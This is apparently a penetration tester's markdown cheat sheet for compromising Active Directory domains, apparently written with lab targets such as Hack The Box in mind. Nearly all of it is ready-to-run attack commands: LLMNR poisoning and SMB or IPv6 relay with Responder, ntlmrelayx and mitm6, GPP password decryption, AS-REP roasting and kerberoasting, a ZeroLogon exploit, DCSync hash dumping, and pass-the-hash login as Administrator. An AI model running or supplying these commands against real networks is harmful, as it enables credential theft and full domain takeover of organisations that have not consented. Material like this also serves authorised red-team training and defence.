# Active Directory

[Top Five Ways I Got Domain Admin on Your Internal Network before Lunch (2018 Edition)](https://medium.com/@adam.toscher/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa)

## LLMNR Poisoning

LLMNR is like DNS on an internal windows network
Listen for connections on wrong network drives and retrieve hashes

(Impacket toolkit required)

```
responder -I eth0 -rdwv
```

Password cracking with hashcat (NTLMv2)

```
hashcat -m 5600 hash.txt rockyou.txt --force
```

## SMB Relay

Relay hashes we gathered and gain access to specific machines. Relayed user credentials must be admin on machine.

### Check if SMB signing is disabled. (Message signing is enabled but not required)

```
nmap --script=smb2-security-mode.nse -p445 192.168.57.0

Save relevant hosts to targets.txt
```

Disable smb and http on responder.conf

```
nano /etc/responder/Responder.conf
```

Start listening for events on responder

```
python responder.py -I eth0 -rdwv
```

Initialize relay

```
ntlmrelayx.py -tf targets.txt -smb2support
```

Retrieve SAM hashes

## Abusing Group Policy Preferences (GPP)

Find the Groups.xml file.

```
\\DOMAIN\SYSVOL\domain\Policies\RANDOMOBJECTS\Machine\Preferences\Groups\Groups.xml
or
findstr /S /I cpassword \\domain.local\sysvol\domain.local\policies\*.xml
```
Retrieve the cpassword hash. Decrypt.

```
gpp-decrypt hash
```

Use can use the credentials with psexec.py or maybe try kerberoasting

## Kerberos (AS-REP Roasting)

Run impacket/GetNPUsers.py to get the users that don't have the require pre-authentication option

```
GetNPUsers.py -dc-ip IP -no-pass -userfile user.txt
```

Crack the hashes found

Use evil-winrm to connect to the box using the credentials found

Use ntlmrelay.py from Impacket to relay any changes made to LDAP.

```
ntlmrelayx.py -t ldap://10.10.10.161 --escalate-user svc-alfresco
```

Authenticate by visiting http://localhost/privexchange (any directory will work, this is random). This sets the user ad Domain Admin.

### Abusing ZeroLogon

```
python3 zerologon_check.py DC IP
python3 cve-2020-1472-exploit.py DC IP
```

Use Impacket’s secretsdump.py to perform the DCSync attack, gathering all the user hashes:

```
secretsdump.py -just-dc DOMAIN/DC\$@IP

secretsdump.py htb.local/user:password@10.10.10.161 -just-dc -outputfile secrets-dump.txt
```

Login using the Administrator hash

```
evil-winrm -u Administrator -i 10.10.10.161 -H '32693b11e6aa90eb43d32c72a07ceea6'

In order to find the plain password hex and restore the password
secretsdump.py administrator@IP -hashes HASH
python3 restorepassword.py DOMAIN/DC@DC_HOSTNAME -target-ip IP -hexpass HEXPASS
```

### Kerbrute

Kerbrute is a popular enumeration tool used to brute-force and enumerate valid active-directory users by abusing the Kerberos pre-authentication.

You need to add the DNS domain name along with the machine IP to /etc/hosts inside of your attacker machine:
10.10.117.212 CONTROLLER.local

```
./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt
```

### Harvesting Tickets w/ Rubeus

On the target machine

```
Rubeus.exe harvest /interval:30

Rubeus.exe kerberoast
This will dump the Kerberos hash of any kerberoastable users
```

### Dumping KRBASREP5 Hashes w/ Rubeus

```
Rubeus.exe asreproast
```

Crack the resulting hashes

## Ipv6 DNS Takeover via mitm6

[GitHub - fox-it/mitm6: pwning IPv4 via IPv6](https://github.com/fox-it/mitm6)

```
mitm6 -d marvel.local
```

Setup relay attack

```
ntlmrelayx.py -6 -t ldaps://192.168.57.140 -wh fakewpad.marvel.local -l lootme
```

[The worst of both worlds: Combining NTLM Relaying and Kerberos delegation - dirkjanm.io](https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/)
